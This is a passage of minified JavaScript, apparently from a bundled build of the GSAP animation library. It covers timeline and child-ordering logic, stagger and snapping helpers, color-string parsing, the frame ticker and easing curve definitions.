            n = e.keyframes ? J0(xt(e.keyframes)) : r1;
        if (It(e.inherit))
            for (; t;) n(e, t.vars.defaults), (t = t.parent || t._dp);
        return e;
    },
    el = function(e, t) {
        for (var n = e.length, i = n === t.length; i && n-- && e[n] === t[n];);
        return n < 0;
    },
    Y5 = function(e, t, n, i, s) {
        void 0 === n && (n = "_first"), void 0 === i && (i = "_last");
        var l,
            o = e[i];
        if (s) for (l = t[s]; o && o[s] > l;) o = o._prev;
        return (
            o ? ((t._next = o._next), (o._next = t)) : ((t._next = e[n]), (e[n] = t)),
            t._next ? (t._next._prev = t) : (e[i] = t),
            (t._prev = o),
            (t.parent = t._dp = e),
            t
        );
    },
    T2 = function(e, t, n, i) {
        void 0 === n && (n = "_first"), void 0 === i && (i = "_last");
        var s = t._prev,
            o = t._next;
        s ? (s._next = o) : e[n] === t && (e[n] = o),
            o ? (o._prev = s) : e[i] === t && (e[i] = s),
            (t._next = t._prev = t.parent = null);
    },
    c3 = function(e, t) {
        e.parent && (!t || e.parent.autoRemoveChildren) && e.parent.remove(e),
            (e._act = 0);
    },
    k3 = function(e, t) {
        if (e && (!t || t._end > e._dur || t._start < 0))
            for (var n = e; n;) (n._dirty = 1), (n = n.parent);
        return e;
    },
    tl = function(e) {
        for (var t = e.parent; t && t.parent;)
            (t._dirty = 1), t.totalDuration(), (t = t.parent);
        return e;
    },
    di = function(e, t, n, i) {
        return (
            e._startAt &&
            (mt
                ? e._startAt.revert($n)
                : (e.vars.immediateRender && !e.vars.autoRevert) ||
                e._startAt.render(t, !0, i))
        );
    },
    rl = function r(e) {
        return !e || (e._ts && r(e.parent));
    },
    os = function(e) {
        return e._repeat ? dr(e._tTime, (e = e.duration() + e._rDelay)) * e : 0;
    },
    dr = function(e, t) {
        var n = Math.floor((e /= t));
        return e && n === e ? n - 1 : n;
    },
    i2 = function(e, t) {
        return (
            (e - t._start) * t._ts +
            (t._ts >= 0 ? 0 : t._dirty ? t.totalDuration() : t._tDur)
        );
    },
    C2 = function(e) {
        return (e._end = ct(
            e._start + (e._tDur / Math.abs(e._ts || e._rts || Ce) || 0)
        ));
    },
    S2 = function(e, t) {
        var n = e._dp;
        return (
            n &&
            n.smoothChildTiming &&
            e._ts &&
            ((e._start = ct(
                n._time -
                (e._ts > 0
                    ? t / e._ts
                    : ((e._dirty ? e.totalDuration() : e._tDur) - t) / -e._ts)
            )),
                C2(e),
                n._dirty || k3(n, e)),
            e
        );
    },
    X5 = function(e, t) {
        var n;
        if (
            ((t._time || (t._initted && !t._dur)) &&
                ((n = i2(e.rawTime(), t)),
                    (!t._dur || _n(0, t.totalDuration(), n) - t._tTime > Ce) &&
                    t.render(n, !0)),
                k3(e, t)._dp && e._initted && e._time >= e._dur && e._ts)
        ) {
            if (e._dur < e.duration())
                for (n = e; n._dp;)
                    n.rawTime() >= 0 && n.totalTime(n._tTime), (n = n._dp);
            e._zTime = -Ce;
        }
    },
    S1 = function(e, t, n, i) {
        return (
            t.parent && c3(t),
            (t._start = ct(
                (U1(n) ? n : n || e !== Ee ? jt(e, n, t) : e._time) + t._delay
            )),
            (t._end = ct(
                t._start + (t.totalDuration() / Math.abs(t.timeScale()) || 0)
            )),
            Y5(e, t, "_first", "_last", e._sort ? "_start" : 0),
            _i(t) || (e._recent = t),
            i || X5(e, t),
            e._ts < 0 && S2(e, e._tTime),
            e
        );
    },
    V5 = function(e, t) {
        return (
            (Yt.ScrollTrigger || i6("scrollTrigger", t)) &&
            Yt.ScrollTrigger.create(t, e)
        );
    },
    j5 = function(e, t, n, i, s) {
        return (
            c6(e, t, s),
            e._initted
                ? !n &&
                    e._pt &&
                    !mt &&
                    ((e._dur && !1 !== e.vars.lazy) || (!e._dur && e.vars.lazy)) &&
                    $5 !== $t.frame
                    ? (s3.push(e), (e._lazy = [s, i]), 1)
                    : void 0
                : 1
        );
    },
    nl = function r(e) {
        var t = e.parent;
        return t && t._ts && t._initted && !t._lock && (t.rawTime() < 0 || r(t));
    },
    _i = function(e) {
        var t = e.data;
        return "isFromStart" === t || "isStart" === t;
    },
    il = function(e, t, n, i) {
        var c,
            u,
            h,
            s = e.ratio,
            o =
                t < 0 ||
                    (!t &&
                        ((!e._start && nl(e) && (e._initted || !_i(e))) ||
                            ((e._ts < 0 || e._dp._ts < 0) && !_i(e))))
                    ? 0
                    : 1,
            l = e._rDelay,
            a = 0;
        if (
            (l &&
                e._repeat &&
                ((a = _n(0, e._tDur, t)),
                    (u = dr(a, l)),
                    e._yoyo && 1 & u && (o = 1 - o),
                    u !== dr(e._tTime, l) &&
                    ((s = 1 - o), e.vars.repeatRefresh && e._initted && e.invalidate())),
                o !== s || mt || i || e._zTime === Ce || (!t && e._zTime))
        ) {
            if (!e._initted && j5(e, t, i, n, a)) return;
            for (
                h = e._zTime,
                e._zTime = t || (n ? Ce : 0),
                n || (n = t && !h),
                e.ratio = o,
                e._from && (o = 1 - o),
                e._time = 0,
                e._tTime = a,
                c = e._pt;
                c;

            )
                c.r(o, c.d), (c = c._next);
            t < 0 && di(e, t, n, !0),
                e._onUpdate && !n && e1(e, "onUpdate"),
                a && e._repeat && !n && e.parent && e1(e, "onRepeat"),
                (t >= e._tDur || t < 0) &&
                e.ratio === o &&
                (o && c3(e, 1),
                    !n &&
                    !mt &&
                    (e1(e, o ? "onComplete" : "onReverseComplete", !0),
                        e._prom && e._prom()));
        } else e._zTime || (e._zTime = t);
    },
    sl = function(e, t, n) {
        var i;
        if (n > t)
            for (i = e._first; i && i._start <= n;) {
                if ("isPause" === i.data && i._start > t) return i;
                i = i._next;
            }
        else
            for (i = e._last; i && i._start >= n;) {
                if ("isPause" === i.data && i._start < t) return i;
                i = i._prev;
            }
    },
    _r = function(e, t, n, i) {
        var s = e._repeat,
            o = ct(t) || 0,
            l = e._tTime / e._tDur;
        return (
            l && !i && (e._time *= o / e._dur),
            (e._dur = o),
            (e._tDur = s ? (s < 0 ? 1e10 : ct(o * (s + 1) + e._rDelay * s)) : o),
            l > 0 && !i && S2(e, (e._tTime = e._tDur * l)),
            e.parent && C2(e),
            n || k3(e.parent, e),
            e
        );
    },
    ls = function(e) {
        return e instanceof Rt ? k3(e) : _r(e, e._dur);
    },
    ol = { _start: 0, endTime: on, totalDuration: on },
    jt = function r(e, t, n) {
        var l,
            a,
            c,
            i = e.labels,
            s = e._recent || ol,
            o = e.duration() >= Gt ? s.endTime(!1) : e._dur;
        return it(t) && (isNaN(t) || t in i)
            ? ((a = t.charAt(0)),
                (c = "%" === t.substr(-1)),
                (l = t.indexOf("=")),
                "<" === a || ">" === a
                    ? (l >= 0 && (t = t.replace(/=/, "")),
                        ("<" === a ? s._start : s.endTime(s._repeat >= 0)) +
                        (parseFloat(t.substr(1)) || 0) *
                        (c ? (l < 0 ? s : n).totalDuration() / 100 : 1))
                    : l < 0
                        ? (t in i || (i[t] = o), i[t])
                        : ((a = parseFloat(t.charAt(l - 1) + t.substr(l + 1))),
                            c && n && (a = (a / 100) * (xt(n) ? n[0] : n).totalDuration()),
                            l > 1 ? r(e, t.substr(0, l - 1), n) + a : o + a))
            : null == t
                ? o
                : +t;
    },
    Ur = function(e, t, n) {
        var l,
            a,
            i = U1(t[1]),
            s = (i ? 2 : 1) + (e < 2 ? 0 : 1),
            o = t[s];
        if ((i && (o.duration = t[1]), (o.parent = n), e)) {
            for (l = o, a = n; a && !("immediateRender" in l);)
                (l = a.vars.defaults || {}), (a = It(a.vars.inherit) && a.parent);
            (o.immediateRender = It(l.immediateRender)),
                e < 2 ? (o.runBackwards = 1) : (o.startAt = t[s - 1]);
        }
        return new Ke(t[0], o, t[s + 1]);
    },
    _3 = function(e, t) {
        return e || 0 === e ? t(e) : t;
    },
    _n = function(e, t, n) {
        return n < e ? e : n > t ? t : n;
    },
    pt = function(e, t) {
        return it(e) && (t = K0.exec(e)) ? t[1] : "";
    },
    ll = function(e, t, n) {
        return _3(n, function(i) {
            return _n(e, t, i);
        });
    },
    pi = [].slice,
    K5 = function(e, t) {
        return (
            e &&
            M1(e) &&
            "length" in e &&
            ((!t && !e.length) || (e.length - 1 in e && M1(e[0]))) &&
            !e.nodeType &&
            e !== Kt
        );
    },
    al = function(e, t, n) {
        return (
            void 0 === n && (n = []),
            e.forEach(function(i) {
                var s;
                return (it(i) && !t) || K5(i, 1)
                    ? (s = n).push.apply(s, Jt(i))
                    : n.push(i);
            }) || n
        );
    },
    Jt = function(e, t, n) {
        return Ye && !t && Ye.selector
            ? Ye.selector(e)
            : !it(e) || n || (!fi && pr())
                ? xt(e)
                    ? al(e, n)
                    : K5(e)
                        ? pi.call(e, 0)
                        : e
                            ? [e]
                            : []
                : pi.call((t || n6).querySelectorAll(e), 0);
    },
    gi = function(e) {
        return (
            (e = Jt(e)[0] || t2("Invalid scope") || {}),
            function(t) {
                var n = e.current || e.nativeElement || e;
                return Jt(
                    t,
                    n.querySelectorAll
                        ? n
                        : n === e
                            ? t2("Invalid scope") || n6.createElement("div")
                            : e
                );
            }
        );
    },
    q5 = function(e) {
        return e.sort(function() {
            return 0.5 - Math.random();
        });
    },
    Q5 = function(e) {
        if (Le(e)) return e;
        var t = M1(e) ? e : { each: e },
            n = R3(t.ease),
            i = t.from || 0,
            s = parseFloat(t.base) || 0,
            o = {},
            l = i > 0 && i < 1,
            a = isNaN(i) || l,
            c = t.axis,
            u = i,
            h = i;
        return (
            it(i)
                ? (u = h = { center: 0.5, edges: 0.5, end: 1 }[i] || 0)
                : !l && a && ((u = i[0]), (h = i[1])),
            function(f, d, m) {
                var v,
                    S,
                    w,
                    C,
                    O,
                    D,
                    M,
                    I,
                    R,
                    p = (m || t).length,
                    y = o[p];
                if (!y) {
                    if (!(R = "auto" === t.grid ? 0 : (t.grid || [1, Gt])[1])) {
                        for (
                            M = -Gt;
                            M < (M = m[R++].getBoundingClientRect().left) && R < p;

                        );
                        R--;
                    }
                    for (
                        y = o[p] = [],
                        v = a ? Math.min(R, p) * u - 0.5 : i % R,
                        S = R === Gt ? 0 : a ? (p * h) / R - 0.5 : (i / R) | 0,
                        M = 0,
                        I = Gt,
                        D = 0;
                        D < p;
                        D++
                    )
                        (w = (D % R) - v),
                            (C = S - ((D / R) | 0)),
                            (y[D] = O = c ? Math.abs("y" === c ? C : w) : k5(w * w + C * C)),
                            O > M && (M = O),
                            O < I && (I = O);
                    "random" === i && q5(y),
                        (y.max = M - I),
                        (y.min = I),
                        (y.v = p =
                            (parseFloat(t.amount) ||
                                parseFloat(t.each) *
                                (R > p
                                    ? p - 1
                                    : c
                                        ? "y" === c
                                            ? p / R
                                            : R
                                        : Math.max(R, p / R)) ||
                                0) * ("edges" === i ? -1 : 1)),
                        (y.b = p < 0 ? s - p : s),
                        (y.u = pt(t.amount || t.each) || 0),
                        (n = n && p < 0 ? s4(n) : n);
                }
                return (
                    (p = (y[f] - y.min) / y.max || 0),
                    ct(y.b + (n ? n(p) : p) * y.v) + y.u
                );
            }
        );
    },
    mi = function(e) {
        var t = Math.pow(10, ((e + "").split(".")[1] || "").length);
        return function(n) {
            var i = ct(Math.round(parseFloat(n) / e) * e * t);
            return (i - (i % 1)) / t + (U1(n) ? 0 : pt(n));
        };
    },
    G5 = function(e, t) {
        var i,
            s,
            n = xt(e);
        return (
            !n &&
            M1(e) &&
            ((i = n = e.radius || Gt),
                e.values
                    ? ((e = Jt(e.values)), (s = !U1(e[0])) && (i *= i))
                    : (e = mi(e.increment))),
            _3(
                t,
                n
                    ? Le(e)
                        ? function(o) {
                            return (s = e(o)), Math.abs(s - o) <= i ? s : o;
                        }
                        : function(o) {
                            for (
                                var f,
                                d,
                                l = parseFloat(s ? o.x : o),
                                a = parseFloat(s ? o.y : 0),
                                c = Gt,
                                u = 0,
                                h = e.length;
                                h--;

                            )
                                s
                                    ? (f = (f = e[h].x - l) * f + (d = e[h].y - a) * d)
                                    : (f = Math.abs(e[h] - l)),
                                    f < c && ((c = f), (u = h));
                            return (
                                (u = !i || c <= i ? e[u] : o),
                                s || u === o || U1(o) ? u : u + pt(o)
                            );
                        }
                    : mi(e)
            )
        );
    },
    J5 = function(e, t, n, i) {
        return _3(xt(e) ? !t : !0 === n ? !!(n = 0) : !i, function() {
            return xt(e)
                ? e[~~(Math.random() * e.length)]
                : (n = n || 1e-5) &&
                (i = n < 1 ? Math.pow(10, (n + "").length - 2) : 1) &&
                Math.floor(
                    Math.round((e - n / 2 + Math.random() * (t - e + 0.99 * n)) / n) *
                    n *
                    i
                ) / i;
        });
    },
    cl = function() {
        for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++)
            t[n] = arguments[n];
        return function(i) {
            return t.reduce(function(s, o) {
                return o(s);
            }, i);
        };
    },
    ul = function(e, t) {
        return function(n) {
            return e(parseFloat(n)) + (t || pt(n));
        };
    },
    fl = function(e, t, n) {
        return t4(e, t, 0, 1, n);
    },
    e4 = function(e, t, n) {
        return _3(n, function(i) {
            return e[~~t(i)];
        });
    },
    hl = function r(e, t, n) {
        var i = t - e;
        return xt(e)
            ? e4(e, r(0, e.length), t)
            : _3(n, function(s) {
                return ((i + ((s - e) % i)) % i) + e;
            });
    },
    dl = function r(e, t, n) {
        var i = t - e,
            s = 2 * i;
        return xt(e)
            ? e4(e, r(0, e.length - 1), t)
            : _3(n, function(o) {
                return e + ((o = (s + ((o - e) % s)) % s || 0) > i ? s - o : o);
            });
    },
    ln = function(e) {
        for (var i, s, o, l, t = 0, n = ""; ~(i = e.indexOf("random(", t));)
            (o = e.indexOf(")", i)),
                (l = "[" === e.charAt(i + 7)),
                (s = e.substr(i + 7, o - i - 7).match(l ? B5 : ui)),
                (n +=
                    e.substr(t, i - t) + J5(l ? s : +s[0], l ? 0 : +s[1], +s[2] || 1e-5)),
                (t = o + 1);
        return n + e.substr(t, e.length - t);
    },
    t4 = function(e, t, n, i, s) {
        var o = t - e,
            l = i - n;
        return _3(s, function(a) {
            return n + (((a - e) / o) * l || 0);
        });
    },
    _l = function r(e, t, n, i) {
        var s = isNaN(e + t)
            ? 0
            : function(d) {
                return (1 - d) * e + d * t;
            };
        if (!s) {
            var a,
                c,
                u,
                h,
                f,
                o = it(e),
                l = {};
            if ((!0 === n && (i = 1) && (n = null), o))
                (e = { p: e }), (t = { p: t });
            else if (xt(e) && !xt(t)) {
                for (u = [], h = e.length, f = h - 2, c = 1; c < h; c++)
                    u.push(r(e[c - 1], e[c]));
                h--,
                    (s = function(m) {
                        m *= h;
                        var p = Math.min(f, ~~m);
                        return u[p](m - p);
                    }),
                    (n = t);
            } else i || (e = B3(xt(e) ? [] : {}, e));
            if (!u) {
                for (a in t) a6.call(l, e, a, "get", t[a]);
                s = function(m) {
                    return h6(m, l) || (o ? e.p : e);
                };
            }
        }
        return _3(n, s);
    },
    as = function(e, t, n) {
        var o,
            l,
            a,
            i = e.labels,
            s = Gt;
        for (o in i)
            (l = i[o] - t) < 0 == !!n &&
                l &&
                s > (l = Math.abs(l)) &&
                ((a = o), (s = l));
        return a;
    },
    e1 = function(e, t, n) {
        var a,
            c,
            u,
            i = e.vars,
            s = i[t],
            o = Ye,
            l = e._ctx;
        if (s)
            return (
                (a = i[t + "Params"]),
                (c = i.callbackScope || e),
                n && s3.length && r2(),
                l && (Ye = l),
                (u = a ? s.apply(c, a) : s.call(c)),
                (Ye = o),
                u
            );
    },
    Ir = function(e) {
        return (
            c3(e),
            e.scrollTrigger && e.scrollTrigger.kill(!!mt),
            e.progress() < 1 && e1(e, "onInterrupt"),
            e
        );
    },
    pl = function(e) {
        var t = (e = (!e.name && e.default) || e).name,
            n = Le(e),
            i =
                t && !n && e.init
                    ? function() {
                        this._props = [];
                    }
                    : e,
            s = { init: on, render: h6, add: a6, kill: kl, modifier: El, rawVars: 0 },
            o = { targetTest: 0, get: 0, getSetter: f6, aliases: {}, register: 0 };
        if ((pr(), e !== i)) {
            if (Zt[t]) return;
            r1(i, r1(n2(e, s), o)),
                B3(i.prototype, B3(s, n2(e, o))),
                (Zt[(i.prop = t)] = i),
                e.targetTest && (zn.push(i), (s6[t] = 1)),
                (t =
                    ("css" === t ? "CSS" : t.charAt(0).toUpperCase() + t.substr(1)) +
                    "Plugin");
        }
        Z5(t, i), e.register && e.register(Xt, i, Ft);
    },
    Te = 255,
    Dr = {
        aqua: [0, Te, Te],
        lime: [0, Te, 0],
        silver: [192, 192, 192],
        black: [0, 0, 0],
        maroon: [128, 0, 0],
        teal: [0, 128, 128],
        blue: [0, 0, Te],
        navy: [0, 0, 128],
        white: [Te, Te, Te],
        olive: [128, 128, 0],
        yellow: [Te, Te, 0],
        orange: [Te, 165, 0],
        gray: [128, 128, 128],
        purple: [128, 0, 128],
        green: [0, 128, 0],
        red: [Te, 0, 0],
        pink: [Te, 192, 203],
        cyan: [0, Te, Te],
        transparent: [Te, Te, Te, 0],
    },
    B2 = function(e, t, n) {
        return (
            ((6 * (e += e < 0 ? 1 : e > 1 ? -1 : 0) < 1
                ? t + (n - t) * e * 6
                : e < 0.5
                    ? n
                    : 3 * e < 2
                        ? t + (n - t) * (2 / 3 - e) * 6
                        : t) *
                Te +
                0.5) |
            0
        );
    },
    r4 = function(e, t, n) {
        var s,
            o,
            l,
            a,
            c,
            u,
            h,
            f,
            d,
            m,
            i = e ? (U1(e) ? [e >> 16, (e >> 8) & Te, e & Te] : 0) : Dr.black;
        if (!i) {
            if (("," === e.substr(-1) && (e = e.substr(0, e.length - 1)), Dr[e]))
                i = Dr[e];
            else if ("#" === e.charAt(0)) {
                if (
                    (e.length < 6 &&
                        ((s = e.charAt(1)),
                            (o = e.charAt(2)),
                            (l = e.charAt(3)),
                            (e =
                                "#" +
                                s +
                                s +
                                o +
                                o +
                                l +
                                l +
                                (5 === e.length ? e.charAt(4) + e.charAt(4) : ""))),
                        9 === e.length)
                )
                    return [
                        (i = parseInt(e.substr(1, 6), 16)) >> 16,
                        (i >> 8) & Te,
                        i & Te,
                        parseInt(e.substr(7), 16) / 255,
                    ];
                i = [(e = parseInt(e.substr(1), 16)) >> 16, (e >> 8) & Te, e & Te];
            } else if ("hsl" === e.substr(0, 3))
                if (((i = m = e.match(ui)), t)) {
                    if (~e.indexOf("="))
                        return (i = e.match(D5)), n && i.length < 4 && (i[3] = 1), i;
                } else
                    (a = (+i[0] % 360) / 360),
                        (c = +i[1] / 100),
                        (s =
                            2 * (u = +i[2] / 100) -
                            (o = u <= 0.5 ? u * (c + 1) : u + c - u * c)),
                        i.length > 3 && (i[3] *= 1),
                        (i[0] = B2(a + 1 / 3, s, o)),
                        (i[1] = B2(a, s, o)),
                        (i[2] = B2(a - 1 / 3, s, o));
            else i = e.match(ui) || Dr.transparent;
            i = i.map(Number);
        }
        return (
            t &&
            !m &&
            ((s = i[0] / Te),
                (o = i[1] / Te),
                (l = i[2] / Te),
                (u = ((h = Math.max(s, o, l)) + (f = Math.min(s, o, l))) / 2),
                h === f
                    ? (a = c = 0)
                    : ((d = h - f),
                        (c = u > 0.5 ? d / (2 - h - f) : d / (h + f)),
                        (a =
                            h === s
                                ? (o - l) / d + (o < l ? 6 : 0)
                                : h === o
                                    ? (l - s) / d + 2
                                    : (s - o) / d + 4),
                        (a *= 60)),
                (i[0] = ~~(a + 0.5)),
                (i[1] = ~~(100 * c + 0.5)),
                (i[2] = ~~(100 * u + 0.5))),
            n && i.length < 4 && (i[3] = 1),
            i
        );
    },
    n4 = function(e) {
        var t = [],
            n = [],
            i = -1;
        return (
            e.split(o3).forEach(function(s) {
                var o = s.match(Q3) || [];
                t.push.apply(t, o), n.push((i += o.length + 1));
            }),
            (t.c = n),
            t
        );
    },
    cs = function(e, t, n) {
        var a,
            c,
            u,
            h,
            i = "",
            s = (e + i).match(o3),
            o = t ? "hsla(" : "rgba(",
            l = 0;
        if (!s) return e;
        if (
            ((s = s.map(function(f) {
                return (
                    (f = r4(f, t, 1)) &&
                    o +
                    (t ? f[0] + "," + f[1] + "%," + f[2] + "%," + f[3] : f.join(",")) +
                    ")"
                );
            })),
                n && ((u = n4(e)), (a = n.c).join(i) !== u.c.join(i)))
        )
            for (h = (c = e.replace(o3, "1").split(Q3)).length - 1; l < h; l++)
                i +=
                    c[l] +
                    (~a.indexOf(l)
                        ? s.shift() || o + "0,0,0,0)"
                        : (u.length ? u : s.length ? s : n).shift());
        if (!c) for (h = (c = e.split(o3)).length - 1; l < h; l++) i += c[l] + s[l];
        return i + c[h];
    },
    o3 = (function() {
        var e,
            r =
                "(?:\\b(?:(?:rgb|rgba|hsl|hsla)\\(.+?\\))|\\B#(?:[0-9a-f]{3,4}){1,2}\\b";
        for (e in Dr) r += "|" + e + "\\b";
        return new RegExp(r + ")", "gi");
    })(),
    gl = /hsl[a]?\(/,
    i4 = function(e) {
        var n,
            t = e.join(" ");
        if (((o3.lastIndex = 0), o3.test(t)))
            return (
                (n = gl.test(t)),
                (e[1] = cs(e[1], n)),
                (e[0] = cs(e[0], n, n4(e[1]))),
                !0
            );
    },
    $t = (function() {
        var a,
            c,
            u,
            h,
            f,
            d,
            r = Date.now,
            e = 500,
            t = 33,
            n = r(),
            i = n,
            s = 1e3 / 240,
            o = s,
            l = [],
            m = function p(y) {
                var w,
                    C,
                    O,
                    D,
                    v = r() - i,
                    S = !0 === y;
                if (
                    (v > e && (n += v - t),
                        ((w = (O = (i += v) - n) - o) > 0 || S) &&
                        ((D = ++h.frame),
                            (f = O - 1e3 * h.time),
                            (h.time = O /= 1e3),
                            (o += w + (w >= s ? 4 : s - w)),
                            (C = 1)),
                        S || (a = c(p)),
                        C)
                )
                    for (d = 0; d < l.length; d++) l[d](O, f, D, y);
            };
        return (h = {
            time: 0,
            frame: 0,
            tick: function() {
                m(!0);
            },
            deltaRatio: function(y) {
                return f / (1e3 / (y || 60));
            },
            wake: function() {
                L5 &&
                    (!fi &&
                        R5() &&
                        ((Kt = fi = window),
                            (n6 = Kt.document || {}),
                            (Yt.gsap = Xt),
                            (Kt.gsapVersions || (Kt.gsapVersions = [])).push(Xt.version),
                            N5(e2 || Kt.GreenSockGlobals || (!Kt.gsap && Kt) || {}),
                            (u = Kt.requestAnimationFrame)),
                        a && h.sleep(),
                        (c =
                            u ||
                            function(y) {
                                return setTimeout(y, (o - 1e3 * h.time + 1) | 0);
                            }),
                        (an = 1),
                        m(2));
            },
            sleep: function() {
                (u ? Kt.cancelAnimationFrame : clearTimeout)(a), (an = 0), (c = on);
            },
            lagSmoothing: function(y, v) {
                (e = y || 1 / 0), (t = Math.min(v || 33, e));
            },
            fps: function(y) {
                (s = 1e3 / (y || 240)), (o = 1e3 * h.time + s);
            },
            add: function(y, v, S) {
                var w = v
                    ? function(C, O, D, M) {
                        y(C, O, D, M), h.remove(w);
                    }
                    : y;
                return h.remove(y), l[S ? "unshift" : "push"](w), pr(), w;
            },
            remove: function(y, v) {
                ~(v = l.indexOf(y)) && l.splice(v, 1) && d >= v && d--;
            },
            _listeners: l,
        });
    })(),
    pr = function() {
        return !an && $t.wake();
    },
    pe = {},
    ml = /^[\d.\-M][\d.\-,\s]/,
    xl = /["']/g,
    yl = function(e) {
        for (
            var l,
            a,
            c,
            t = {},
            n = e.substr(1, e.length - 3).split(":"),
            i = n[0],
            s = 1,
            o = n.length;
            s < o;
            s++
        )
            (a = n[s]),
                (l = s !== o - 1 ? a.lastIndexOf(",") : a.length),
                (c = a.substr(0, l)),
                (t[i] = isNaN(c) ? c.replace(xl, "").trim() : +c),
                (i = a.substr(l + 1).trim());
        return t;
    },
    vl = function(e) {
        var t = e.indexOf("(") + 1,
            n = e.indexOf(")"),
            i = e.indexOf("(", t);
        return e.substring(t, ~i && i < n ? e.indexOf(")", n + 1) : n);
    },
    bl = function(e) {
        var t = (e + "").split("("),
            n = pe[t[0]];
        return n && t.length > 1 && n.config
            ? n.config.apply(
                null,
                ~e.indexOf("{") ? [yl(t[1])] : vl(e).split(",").map(W5)
            )
            : pe._CE && ml.test(e)
                ? pe._CE("", e)
                : n;
    },
    s4 = function(e) {
        return function(t) {
            return 1 - e(1 - t);
        };
    },
    o4 = function r(e, t) {
        for (var i, n = e._first; n;)
            n instanceof Rt
                ? r(n, t)
                : n.vars.yoyoEase &&
                (!n._yoyo || !n._repeat) &&
                n._yoyo !== t &&
                (n.timeline
                    ? r(n.timeline, t)
                    : ((i = n._ease),
                        (n._ease = n._yEase),
                        (n._yEase = i),
                        (n._yoyo = t))),
                (n = n._next);
    },
    R3 = function(e, t) {
        return (e && (Le(e) ? e : pe[e] || bl(e))) || t;
    },
    z3 = function(e, t, n, i) {
        void 0 === n &&
            (n = function(a) {
                return 1 - t(1 - a);
            }),
            void 0 === i &&
            (i = function(a) {
                return a < 0.5 ? t(2 * a) / 2 : 1 - t(2 * (1 - a)) / 2;
            });
        var o,
            s = { easeIn: t, easeOut: n, easeInOut: i };
        return (
            Dt(e, function(l) {
                for (var a in ((pe[l] = Yt[l] = s), (pe[(o = l.toLowerCase())] = n), s))
                    pe[
                        o + ("easeIn" === a ? ".in" : "easeOut" === a ? ".out" : ".inOut")
                    ] = pe[l + "." + a] = s[a];
            }),
            s
        );
    },
    l4 = function(e) {
        return function(t) {
            return t < 0.5 ? (1 - e(1 - 2 * t)) / 2 : 0.5 + e(2 * (t - 0.5)) / 2;
        };
    },
    L2 = function r(e, t, n) {
        var i = t >= 1 ? t : 1,
            s = (n || (e ? 0.3 : 0.45)) / (t < 1 ? t : 1),
            o = (s / ci) * (Math.asin(1 / i) || 0),
            l = function(u) {
                return 1 === u ? 1 : i * Math.pow(2, -10 * u) * j0((u - o) * s) + 1;
            },
            a =
                "out" === e
                    ? l
                    : "in" === e
                        ? function(c) {
                            return 1 - l(1 - c);
                        }
                        : l4(l);
        return (
            (s = ci / s),
            (a.config = function(c, u) {
                return r(e, c, u);
            }),
            a
        );
    },
    N2 = function r(e, t) {
        void 0 === t && (t = 1.70158);
        var n = function(o) {
            return o ? --o * o * ((t + 1) * o + t) + 1 : 0;
        },
            i =
                "out" === e
                    ? n
                    : "in" === e
                        ? function(s) {
                            return 1 - n(1 - s);
                        }
                        : l4(n);
        return (
            (i.config = function(s) {
                return r(e, s);
            }),
            i
        );
    };
Dt("Linear,Quad,Cubic,Quart,Quint,Strong", function(r, e) {
    var t = e < 5 ? e + 1 : e;
    z3(
        r + ",Power" + (t - 1),
        e
            ? function(n) {
                return Math.pow(n, t);
            }
            : function(n) {
                return n;
            },
        function(n) {
            return 1 - Math.pow(1 - n, t);
        },
        function(n) {
            return n < 0.5
                ? Math.pow(2 * n, t) / 2
                : 1 - Math.pow(2 * (1 - n), t) / 2;
        }
    );
}),
    (pe.Linear.easeNone = pe.none = pe.Linear.easeIn),
    z3("Elastic", L2("in"), L2("out"), L2()),
    (function(r, e) {
        var t = 1 / e,
            s = function(l) {
                return l < t
                    ? r * l * l
                    : l < 0.7272727272727273
                        ? r * Math.pow(l - 1.5 / e, 2) + 0.75
                        : l < 0.9090909090909092
                            ? r * (l -= 2.25 / e) * l + 0.9375
                            : r * Math.pow(l - 2.625 / e, 2) + 0.984375;
            };
        z3(
            "Bounce",
            function(o) {
                return 1 - s(1 - o);
            },
            s
        );
    })(7.5625, 2.75),
    z3("Expo", function(r) {
        return r ? Math.pow(2, 10 * (r - 1)) : 0;
    }),
    z3("Circ", function(r) {
        return -(k5(1 - r * r) - 1);
    }),
    z3("Sine", function(r) {
        return 1 === r ? 1 : 1 - V0(r * Y0);
    }),
    z3("Back", N2("in"), N2("out"), N2()),
    (pe.SteppedEase =
        pe.steps =
        Yt.SteppedEase =
        {
            config: function(e, t) {
                void 0 === e && (e = 1);
                var n = 1 / e,
                    i = e + (t ? 0 : 1),
                    s = t ? 1 : 0,
                    o = 1 - Ce;
                return function(l) {
                    return (((i * _n(0, o, l)) | 0) + s) * n;
                };
            },
        }),
    (hr.ease = pe["quad.out"]),
    Dt(
        "onComplete,onUpdate,onStart,onRepeat,onReverseComplete,onInterrupt",
        function(r) {
            return (o6 += r + "," + r + "Params,");
        }
    );
var a4 = function(e, t) {
    (this.id = X0++),
        (e._gsap = this),
        (this.target = e),
        (this.harness = t),
        (this.get = t ? t.get : z5),
        (this.set = t ? t.getSetter : f6);
},
    gr = (function() {
        function r(t) {
            (this.vars = t),
                (this._delay = +t.delay || 0),
                (this._repeat = t.repeat === 1 / 0 ? -2 : t.repeat || 0) &&
                ((this._rDelay = t.repeatDelay || 0),
                    (this._yoyo = !!t.yoyo || !!t.yoyoEase)),
                (this._ts = 1),
                _r(this, +t.duration, 1, 1),
                (this.data = t.data),
                Ye && ((this._ctx = Ye), Ye.data.push(this)),
                an || $t.wake();
        }
        var e = r.prototype;
        return (
            (e.delay = function(n) {
                return n || 0 === n
                    ? (this.parent &&
                        this.parent.smoothChildTiming &&
                        this.startTime(this._start + n - this._delay),
                        (this._delay = n),
                        this)
                    : this._delay;
            }),
            (e.duration = function(n) {
                return arguments.length
                    ? this.totalDuration(
                        this._repeat > 0 ? n + (n + this._rDelay) * this._repeat : n
                    )
                    : this.totalDuration() && this._dur;
            }),
            (e.totalDuration = function(n) {
                return arguments.length
                    ? ((this._dirty = 0),
                        _r(
                            this,
                            this._repeat < 0
                                ? n
                                : (n - this._repeat * this._rDelay) / (this._repeat + 1)
                        ))
                    : this._tDur;
            }),
            (e.totalTime = function(n, i) {
                if ((pr(), !arguments.length)) return this._tTime;
                var s = this._dp;
                if (s && s.smoothChildTiming && this._ts) {
                    for (S2(this, n), !s._dp || s.parent || X5(s, this); s && s.parent;)
                        s.parent._time !==
                            s._start +
                            (s._ts >= 0
                                ? s._tTime / s._ts
                                : (s.totalDuration() - s._tTime) / -s._ts) &&
                            s.totalTime(s._tTime, !0),
                            (s = s.parent);
                    !this.parent &&
                        this._dp.autoRemoveChildren &&
